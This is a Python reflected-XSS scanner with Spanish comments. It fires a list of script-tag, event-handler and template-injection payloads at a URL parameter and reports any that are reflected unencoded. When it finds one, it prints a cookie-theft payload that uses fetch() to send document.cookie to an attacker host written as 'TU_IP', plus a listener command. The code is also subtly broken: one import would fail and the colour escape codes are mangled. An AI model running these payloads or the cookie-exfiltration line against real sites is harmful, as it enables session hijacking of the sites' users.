#!/usr/bin/env python3
"""
xss_scanner.py -- Detector basico de XSS Reflected
Uso:
    python3 xss_scanner.py --url http://objetivo.com/search --param q
    python3 xss_scanner.py --url "http://objetivo.com/search?q=test"
"""
import argparse, urllib.request, urllib.error, urllib.parse

class C:
    RED="[91m";GREEN="[92m";YELLOW="[93m"
    BLUE="[94m";BOLD="[1m";RESET="[0m"

def ok(m):   print(C.GREEN+"  [+] "+C.RESET+m)
def info(m): print(C.BLUE+"  [*] "+C.RESET+m)
def crit(m): print(C.RED+C.BOLD+"  [VULNERABLE] "+C.RESET+m)

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<body onload=alert(1)>',
    '{{7*7}}',                    # Template injection tambien
    '${7*7}',
]

def fetch(url):
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.read().decode("utf-8","ignore")
    except Exception:
        return ""

def build_url(base_url, param, payload):
    if param:
        parsed = urllib.parse.urlparse(base_url)
        qs = urllib.parse.parse_qs(parsed.query)
        qs[param] = [payload]
        new_qs = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_qs))
    else:
        sep = "&" if "?" in base_url else "?"
        return base_url + sep + urllib.parse.quote(payload, safe="=&?")

def banner():
    print("[94m[1m")
    print("  ╔═══════════════════════════════════════════╗")
    print("  ║   XSS SCANNER -- Reflected XSS Detector  ║")
    print("  ╚═══════════════════════════════════════════╝")
    print("[0m")

def main():
    banner()
    p = argparse.ArgumentParser()
    p.add_argument("--url",   required=True)
    p.add_argument("--param", default=None, help="Nombre del parametro a testear")
    args = p.parse_args()

    info("Objetivo: "+args.url)
    info("Probando "+str(len(XSS_PAYLOADS))+" payloads XSS...")
    print()

    vulnerable = False
    for payload in XSS_PAYLOADS:
        test_url = build_url(args.url, args.param, payload)
        content  = fetch(test_url)

        if payload.lower() in content.lower():
            crit("Payload reflejado sin codificar: "+payload[:50])
            crit("URL: "+test_url[:100])
            vulnerable = True
        elif payload[:5].lower() in content.lower():
            from C import warn
            print(C.YELLOW+"  [?] "+C.RESET+"Reflexion parcial con: "+payload[:50])

    print()
    if not vulnerable:
        ok("No se detecto XSS Reflected automaticamente")
        info("Probar manualmente con Burp Suite")
        info("Buscar el punto donde el input aparece en la respuesta HTML")
    else:
        print("  "+"="*55)
        info("Para robar cookies de sesion:")
        print("  Payload: <script>fetch('http://TU_IP:8000/?c='+document.cookie)</script>")
        print("  Servidor: python3 -m http.server 8000")

if __name__ == "__main__":
    main()
